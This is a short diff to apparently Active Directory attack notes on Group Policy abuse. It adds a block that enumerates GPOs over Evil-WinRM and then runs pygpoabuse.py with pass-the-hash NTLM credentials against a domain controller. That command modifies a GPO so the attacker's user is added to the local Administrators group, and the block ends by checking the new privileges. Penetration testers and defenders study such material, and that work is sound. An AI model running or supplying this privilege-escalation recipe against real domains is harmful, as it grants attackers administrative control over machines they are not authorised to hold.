@@ -30,6 +30,17 @@ Invoke-GPUpdate -Computer TARGET -Force
 gpupdate /force   # On target machine
 ```
 
+```bash
+# Evil-WinRM 
+Get-GPO -All 
+
+# Tarminal
+python3 pygpoabuse.py #DOMAIN/$USER -hashes ':$NTLM' -dc-ip $DC_IP -gpo-id '123abc4d-xxxx-xxxx-xxxx' -command 'net localgroup Administrators $USER /add' -f
+
+# Check the privilege 
+net user $USER
+```
+
 ## 8.2 AdminSDHolder Abuse
 
 AdminSDHolder is a special container that holds the security descriptor template for
